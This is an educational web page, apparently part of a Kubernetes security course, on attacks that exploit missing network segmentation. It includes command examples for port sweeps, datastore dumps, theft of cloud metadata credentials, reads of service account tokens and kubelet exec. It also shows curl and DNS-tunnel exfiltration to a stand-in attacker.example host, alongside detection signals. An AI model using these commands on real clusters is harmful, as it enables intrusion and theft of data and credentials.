@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K07: Missing Network Segmentation Controls - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/kubernetes" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>K07: Missing Network Segmentation Controls - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding Segmentation Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#patterns">Common Attack Patterns</a></li>
+<li><a href="#chaining">Chaining a Flat Network into Full Compromise</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding Segmentation Attack Vectors</h2>
+
+<blockquote>
+<p><strong>&#9888; EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.</p>
+</blockquote>
+
+<p>Missing segmentation is not exploited with an exotic payload. It is exploited by <strong>reachability</strong>: once an attacker has code running in any pod, the flat network lets ordinary connections do the rest. The initial foothold might come from a vulnerable web app, an SSRF, a poisoned dependency, or a compromised image&mdash;K07 is what happens <em>next</em>. On a segmented cluster, that foothold is boxed in. On a flat one, it inherits the reachability of the entire cluster.</p>
+
+<p>The attacker's goals in this category are:</p>
+<ul>
+<li>Map the internal network&mdash;which pods, services, and datastores are reachable.</li>
+<li>Pivot east-west to higher-value targets (databases, admin APIs, other namespaces/tenants).</li>
+<li>Reach the control plane surface (API server, kubelet) and the cloud metadata endpoint.</li>
+<li>Establish egress for command-and-control and data exfiltration.</li>
+</ul>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Land
+   |  Code execution in one pod (app vuln, SSRF, supply chain)
+   v
+2. Discover
+   |  Enumerate reachable pods/services, DNS, ClusterIPs, ports
+   v
+3. Pivot (east-west)
+   |  Connect to databases, caches, internal/admin APIs, other namespaces
+   v
+4. Escalate
+   |  Reach API server / kubelet; hit 169.254.169.254 for cloud creds
+   v
+5. Exfiltrate / Persist
+   |  Open egress to C2, exfil data, deploy miners or backdoors</code></pre>
+
+<h2 id="patterns">Common Attack Patterns</h2>
+
+<h3>1. Internal Reconnaissance and Service Discovery</h3>
+
+<p>On a flat network, cluster DNS and the pod CIDR hand the attacker a map for free.</p>
+
+<pre><code># Cluster DNS enumerates services across ALL namespaces:
+nslookup payments-db.payments.svc.cluster.local
+nslookup admin-api.internal.svc.cluster.local
+
+# Sweep the pod/service network for open ports from inside a pod:
+for ip in 10.0.0.{1..254}; do
+  nc -z -w1 $ip 5432 2>/dev/null &amp;&amp; echo "$ip:5432 open (postgres)"
+  nc -z -w1 $ip 6379 2>/dev/null &amp;&amp; echo "$ip:6379 open (redis)"
+done</code></pre>
+
+<p><strong>Payoff</strong>: a full inventory of reachable services&mdash;databases, caches, brokers, admin APIs&mdash;none of which should be reachable from this pod.</p>
+
+<h3>2. Direct Datastore Access After a Foothold</h3>
+
+<p>The database was reachable from every pod, not just its API tier.</p>
+
+<pre><code># From a compromised frontend pod, connect straight to the DB:
+psql "postgres://app:S3cr3t@payments-db.payments.svc:5432/prod" -c "SELECT * FROM cards LIMIT 5;"
+redis-cli -h cache.default.svc -p 6379 KEYS '*'
+mongosh "mongodb://reports-db.analytics.svc:27017/prod" --eval "db.users.find()"</code></pre>
+
+<p><strong>Payoff</strong>: bulk read, tamper, or wipe of data with no application bug&mdash;just reachability plus weak/default datastore auth.</p>
+
+<h3>3. Cross-Namespace / Cross-Tenant Pivot</h3>
+
+<p>Namespaces are not a network boundary, so the attacker crosses them at will.</p>
+
+<pre><code># From team-a's compromised pod, reach team-b's and prod's services:
+curl http://orders-api.team-b.svc.cluster.local/internal/dump
+curl http://secrets-proxy.prod.svc.cluster.local/v1/creds</code></pre>
+
+<p><strong>Payoff</strong>: one tenant's or environment's compromise reaches another's data&mdash;exactly the isolation customers assume they have.</p>
+
+<h3>4. SSRF-to-Metadata Cloud Credential Theft</h3>
+
+<p>Unrestricted egress makes the link-local metadata endpoint reachable from pods.</p>
+
+<pre><code># Reachable from the pod because there is no egress policy:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# -> node-instance-role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/node-instance-role
+# -> { "AccessKeyId": "...", "SecretAccessKey": "...", "Token": "..." }
+
+# The stolen node credentials are then used against the cloud API:
+aws s3 ls   # with the exfiltrated temporary credentials</code></pre>
+
+<p><strong>Payoff</strong>: escalation from "one container" to the node's cloud identity&mdash;often far more privileged than the workload. Any in-app SSRF becomes cloud credential theft on a flat-egress cluster.</p>
+
+<h3>5. Reaching the Control Plane (API Server &amp; Kubelet)</h3>
+
+<p>Pods can frequently route to the API server and to node kubelets.</p>
+
+<pre><code># The default ServiceAccount token is mounted in the pod:
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
+
+# A kubelet with anonymous/read access exposes pods and can exec:
+curl -sk https://&lt;node-ip&gt;:10250/pods
+curl -sk "https://&lt;node-ip&gt;:10250/run/&lt;ns&gt;/&lt;pod&gt;/&lt;container&gt;" -d "cmd=id"</code></pre>
+
+<p><strong>Payoff</strong>: with a usable token or a permissive kubelet, reachability turns into reading secrets, executing in other pods, or cluster takeover. Segmentation that blocks pods from the kubelet port and limits API-server reach removes this path.</p>
+
+<h3>6. Unrestricted Egress for C2 and Exfiltration</h3>
+
+<p>Nothing stops a pod from talking to the internet.</p>
+
+<pre><code># Beacon to attacker infrastructure and exfiltrate:
+curl -X POST https://attacker.example/c2 -d @/etc/secrets/db-password
+tar czf - /data | curl -T - https://attacker.example/loot
+# DNS tunneling when only DNS egress is (accidentally) allowed:
+for chunk in $(split_secret); do nslookup $chunk.exfil.attacker.example; done</code></pre>
+
+<p><strong>Payoff</strong>: reliable command-and-control and data exfiltration. Default-deny egress with an allow-list is what closes this.</p>
+
+<h3>7. Wormable Lateral Movement</h3>
+
+<p>Because every pod can reach every pod, a self-propagating payload spreads without obstruction.</p>
+
+<pre><code># Simplified worm loop running inside a compromised pod:
+for host in $(discover_reachable_pods); do
+  if exploit_or_weak_cred $host; then
+     copy_payload $host &amp;&amp; run_payload $host   # miner / backdoor
+  fi
+done</code></pre>
+
+<p><strong>Payoff</strong>: cluster-wide compromise and resource hijacking (cryptomining) from a single entry point&mdash;the classic Kubernetes worm pattern that a flat network enables.</p>
+
+<h3>8. Impersonation Without mTLS</h3>
+
+<p>Without service identity, a service trusts whatever connects to it.</p>
+
+<pre><code># No mTLS: the orders service accepts a spoofed "internal" caller:
+curl http://orders.prod.svc/internal/refund \
+  -H "X-Internal-Caller: billing" \
+  -d '{"amount": 100000, "to": "attacker"}'</code></pre>
+
+<p><strong>Payoff</strong>: an attacker in the cluster impersonates trusted services and abuses "internal-only" endpoints that rely on network position as their only authentication.</p>
+
+<h2 id="chaining">Chaining a Flat Network into Full Compromise</h2>
+
+<p>The individual steps are unremarkable; the flat network is what lets them chain end to end.</p>
+
+<pre><code>App vuln in a frontend pod        -> code execution in one pod
+        +
+No egress policy                  -> curl 169.254.169.254 -> node cloud creds
+        +
+Over-privileged node role         -> read cloud storage / widen access
+        =  cloud-account compromise from a single web bug</code></pre>
+
+<p>Another common chain, staying inside the cluster:</p>
+
+<pre><code>Foothold in dev namespace         -> DNS + port sweep (no default-deny)
+        -> reach prod datastore across namespaces (no isolation)
+        -> dump data; open egress to C2 (no egress policy)
+        =  cross-environment data breach, no control-plane bug needed</code></pre>
+
+<h2>Detection Opportunities</h2>
+
+<table>
+<thead>
+<tr><th>Attacker Action</th><th>Observable Signal</th></tr>
+</thead>
+<tbody>
+<tr><td>Internal port sweep</td><td>Many short-lived connections from one pod to many IPs/ports</td></tr>
+<tr><td>Cross-namespace calls</td><td>Flows between namespaces that never normally communicate</td></tr>
+<tr><td>Metadata access</td><td>Any pod connection to <code>169.254.169.254</code></td></tr>
+<tr><td>Kubelet / API probing</td><td>Pod traffic to <code>:10250</code> or unusual API-server call volume</td></tr>
+<tr><td>Exfiltration / C2</td><td>Egress to unknown external hosts; large outbound transfers; DNS tunneling</td></tr>
+</tbody>
+</table>
+
+<p>These signals are only visible if you collect flow logs (CNI flow logs, mesh telemetry). A flat network with no observability hands the attacker both reachability and invisibility.</p>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>K07 is exploited by reachability, not payloads</strong>&mdash;the foothold comes from elsewhere; the flat network is what makes it catastrophic.</li>
+<li><strong>Discovery is free on a flat cluster</strong>&mdash;cluster DNS and the pod CIDR map every reachable target.</li>
+<li><strong>Egress is the escalation path</strong>&mdash;the metadata endpoint and open internet turn a pod foothold into cloud-account theft and exfiltration.</li>
+<li><strong>The control plane is in reach</strong>&mdash;API server and kubelet are often just another pod-to-service connection away.</li>
+<li><strong>No identity means impersonation</strong>&mdash;without mTLS, network position is treated as authentication, and attackers have that position.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention</a></strong>: Default-deny baselines, egress control, and mesh mTLS</li>
+<li><strong><a href="examples.html">Examples</a></strong>: Insecure vs. secure NetworkPolicy and isolation</li>
+<li><strong><a href="/learn/kubernetes">Kubernetes Learning Path</a></strong>: Continue the OWASP Kubernetes Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply what you've learned in hands-on exercises</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
